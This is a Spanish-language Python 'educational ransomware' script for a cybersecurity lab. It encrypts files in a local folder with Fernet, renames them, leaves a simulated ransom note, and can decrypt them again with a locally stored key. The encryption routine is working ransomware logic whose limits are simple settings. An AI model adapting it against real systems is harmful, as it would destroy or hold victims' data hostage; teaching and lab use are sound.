"""
RANSOMWARE EDUCATIVO - Laboratorio de Ciberseguridad
=====================================================
ADVERTENCIA: Este script es EXCLUSIVAMENTE para fines educativos
en un entorno de laboratorio aislado y controlado.

Salvaguardas incorporadas:
- Cifra solo archivos dentro de TARGET_DIR (carpeta aislada)
- NO se propaga por red, NO persiste en el sistema, NO exfiltra datos
- La clave de recuperacion se guarda localmente (clave.key)
- Es 100% reversible: python ransomware_educativo.py --decrypt
- Respeta una lista negra de extensiones criticas del sistema
"""

import sys
import argparse
from pathlib import Path
from cryptography.fernet import Fernet

# ============ CONFIGURACION ============
TARGET_DIR = Path(__file__).parent / "victima"  # carpeta de archivos objetivo
KEY_FILE = Path(__file__).parent / "clave.key"
SCRIPT_NAME = Path(__file__).name

# Extensiones que NUNCA se deben cifrar (criticas del sistema)
BLACKLIST_EXT = {
    ".exe", ".dll", ".sys", ".ini", ".bat", ".cmd", ".msi",
    ".so", ".dylib", ".bin", ".dat", ".db", ".key",
}

# Extensiones que si se cifran en el laboratorio
TARGET_EXT = {".txt", ".docx", ".pdf", ".xlsx", ".png", ".jpg", ".jpeg", ".csv", ".md", ".py"}


def generar_clave():
    """Genera y guarda una clave Fernet (AES-128-CBC + HMAC-SHA256)."""
    clave = Fernet.generate_key()
    KEY_FILE.write_bytes(clave)
    return clave


def cargar_clave():
    """Carga la clave existente o genera una nueva."""
    if KEY_FILE.exists():
        return KEY_FILE.read_bytes()
    return generar_clave()


def archivos_objetivo():
    """Devuelve la lista de archivos que seran cifrados."""
    if not TARGET_DIR.exists():
        print(f"[!] La carpeta objetivo no existe: {TARGET_DIR}")
        return []
    archivos = []
    for archivo in TARGET_DIR.rglob("*"):
        if archivo.is_file():
            # Saltar archivos del propio laboratorio
            if archivo.name == SCRIPT_NAME or archivo.name == "clave.key":
                continue
            # Saltar extensiones criticas
            if archivo.suffix.lower() in BLACKLIST_EXT:
                continue
            # Filtrar por extensiones objetivo
            if archivo.suffix.lower() in TARGET_EXT:
                archivos.append(archivo)
    return archivos


def cifrar():
    """Cifra todos los archivos objetivo y deja una nota de rescate simulada."""
    print("[*] Iniciando cifrado del laboratorio...")
    clave = cargar_clave()
    fernet = Fernet(clave)
    archivos = archivos_objetivo()
    if not archivos:
        print("[!] No hay archivos objetivo para cifrar.")
        return

    for archivo in archivos:
        try:
            datos = archivo.read_bytes()
            cifrado = fernet.encrypt(datos)
            archivo.write_bytes(cifrado)
            # Renombrar para simular el efecto visual de un ataque real
            nuevo_nombre = archivo.with_suffix(archivo.suffix + ".encrypted")
            archivo.rename(nuevo_nombre)
            print(f"[+] Cifrado: {archivo.name}")
        except Exception as e:
            print(f"[-] Error con {archivo.name}: {e}")

    # Nota de rescate SIMULADA (sin pago real)
    nota = """=============================================
        !SUS ARCHIVOS HAN SIDO CIFRADOS!
=============================================

Este es un SIMULACRO EDUCATIVO para la clase de
ciberseguridad. No hay ningun rescate real.

Sus archivos fueron cifrados con AES (Fernet).

Para recuperarlos (en el laboratorio):
    python ransomware_educativo.py --decrypt

La clave de recuperacion esta en: clave.key
(NO haga esto en un ataque real: los criminales
NO entregan la clave y exigen pago en criptomonedas).

--- Leccion: los rescates NO se pagan, se restauran ---
"""
    nota_path = TARGET_DIR / "NOTA_DE_RESCATE.txt"
    nota_path.write_text(nota, encoding="utf-8")
    print("[*] Nota de rescate creada en la carpeta objetivo.")
    print(f"[*] Archivos cifrados: {len(archivos)}")


def descifrar():
    """Descifra todos los archivos .encrypted de la carpeta objetivo."""
    print("[*] Iniciando descifrado del laboratorio...")
    if not KEY_FILE.exists():
        print("[!] No se encuentra clave.key. No es posible descifrar.")
        return
    clave = KEY_FILE.read_bytes()
    fernet = Fernet(clave)

    cifrados = list(TARGET_DIR.rglob("*.encrypted")) if TARGET_DIR.exists() else []

    # Eliminar nota simulada
    nota_path = TARGET_DIR / "NOTA_DE_RESCATE.txt"
    if nota_path.exists():
        nota_path.unlink()

    if not cifrados:
        print("[!] No hay archivos .encrypted para descifrar.")
        return

    for archivo in cifrados:
        try:
            datos = archivo.read_bytes()
            original = fernet.decrypt(datos)
            nombre_original = archivo.with_suffix("")  # quita .encrypted
            nombre_original.write_bytes(original)
            archivo.unlink()
            print(f"[+] Descifrado: {nombre_original.name}")
        except Exception as e:
            print(f"[-] Error con {archivo.name}: {e}")
    print(f"[*] Archivos descifrados: {len(cifrados)}")


def main():
    parser = argparse.ArgumentParser(description="Laboratorio educativo de ransomware (100% reversible)")
    parser.add_argument("--decrypt", action="store_true", help="Descifra los archivos cifrados")
    args = parser.parse_args()

    print("=" * 50)
    print("RANSOMWARE EDUCATIVO - LABORATORIO CONTROLADO")
    print("=" * 50)

    if args.decrypt:
        descifrar()
    else:
        cifrar()

    print("[*] Operacion completada.")


if __name__ == "__main__":
    main()
